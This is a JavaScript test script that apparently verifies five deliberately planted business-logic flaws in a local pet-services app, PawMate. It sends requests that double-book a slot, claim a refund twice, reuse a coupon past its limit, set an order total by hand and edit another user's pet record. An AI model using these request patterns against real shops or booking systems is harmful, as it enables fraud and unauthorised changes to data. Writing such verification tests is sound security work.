// test-vuln.js - Verification of 5 Business Logic Flaws for PawMate (Port 9933)
const PORT = 9933;
const BASE_URL = `http://localhost:${PORT}`;

async function runTests() {
  console.log('🐾 Starting Business Logic Vulnerability Verification for PawMate (Port 9933)...\n');
  let passed = 0;

  // 1. SEC-351: Double Booking
  try {
    const payload = {
      providerId: 'prov-001',
      serviceId: 'srv-001',
      petId: 'pet-001',
      date: '2026-04-05',
      startTime: '14:00',
      endTime: '15:00',
      price: 25000
    };
    const res = await fetch(`${BASE_URL}/api/bookings`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).then(r => r.json());

    if (res.success && res.data.providerId === 'prov-001' && res.data.date === '2026-04-05') {
      console.log(`✅ [SEC-351] Double Booking Validation Missing -> PASSED (Conflicting Booking ID: ${res.data.id})`);
      passed++;
    } else {
      console.log(`❌ [SEC-351] FAILED`, res);
    }
  } catch (err) {
    console.log(`❌ [SEC-351] ERROR:`, err.message);
  }

  // 2. SEC-352: Duplicate Refund Credit
  try {
    const ptBefore = await fetch(`${BASE_URL}/api/points/balance`).then(r => r.json());
    const r1 = await fetch(`${BASE_URL}/api/bookings/bk-1003/refund`, { method: 'POST' }).then(r => r.json());
    const r2 = await fetch(`${BASE_URL}/api/bookings/bk-1003/refund`, { method: 'POST' }).then(r => r.json());
    const ptAfter = await fetch(`${BASE_URL}/api/points/balance`).then(r => r.json());

    if (r1.success && r2.success && ptAfter.data.points >= ptBefore.data.points + 70000) {
      console.log(`✅ [SEC-352] Duplicate Refund Credit Error -> PASSED (Points credited twice: +70,000P)`);
      passed++;
    } else {
      console.log(`❌ [SEC-352] FAILED`, { r1, r2, ptBefore, ptAfter });
    }
  } catch (err) {
    console.log(`❌ [SEC-352] ERROR:`, err.message);
  }

  // 3. SEC-353: Coupon Usage Limit Bypass
  try {
    const r1 = await fetch(`${BASE_URL}/api/coupons/coup-001/apply`, { method: 'POST' }).then(r => r.json());
    const r2 = await fetch(`${BASE_URL}/api/coupons/coup-001/apply`, { method: 'POST' }).then(r => r.json());

    if (r1.success && r2.success && r2.data.usedCount > r2.data.usageLimit) {
      console.log(`✅ [SEC-353] Coupon Reuse Limit Bypass -> PASSED (usedCount: ${r2.data.usedCount} > limit: ${r2.data.usageLimit})`);
      passed++;
    } else {
      console.log(`❌ [SEC-353] FAILED`, { r1, r2 });
    }
  } catch (err) {
    console.log(`❌ [SEC-353] ERROR:`, err.message);
  }

  // 4. SEC-354: Client-Controlled Order Total Amount
  try {
    const payload = {
      items: [
        { productId: 'prod-001', quantity: 1 }, // 38,000
        { productId: 'prod-002', quantity: 1 }  // 9,500
      ],
      totalAmount: 1000 // Client forced 1000
    };
    const res = await fetch(`${BASE_URL}/api/orders`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).then(r => r.json());

    if (res.success && res.data.totalAmount === 1000 && res.data.subtotal === 47500) {
      console.log(`✅ [SEC-354] Client-Controlled Total Amount -> PASSED (Order Total: ${res.data.totalAmount} vs Subtotal: ${res.data.subtotal})`);
      passed++;
    } else {
      console.log(`❌ [SEC-354] FAILED`, res);
    }
  } catch (err) {
    console.log(`❌ [SEC-354] ERROR:`, err.message);
  }

  // 5. SEC-355: Pet Resource Ownership Missing
  try {
    const res = await fetch(`${BASE_URL}/api/pets/pet-003`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ notes: '소유권 검증 없이 임의 수정된 차트' })
    }).then(r => r.json());

    if (res.success && res.data.notes === '소유권 검증 없이 임의 수정된 차트') {
      console.log(`✅ [SEC-355] Pet Resource Ownership Missing -> PASSED (Target: pet-003 modified)`);
      passed++;
    } else {
      console.log(`❌ [SEC-355] FAILED`, res);
    }
  } catch (err) {
    console.log(`❌ [SEC-355] ERROR:`, err.message);
  }

  console.log(`\n========================================`);
  console.log(`🎉 Test Results: ${passed} / 5 vulnerabilities verified!`);
  console.log(`========================================\n`);
}

runTests();
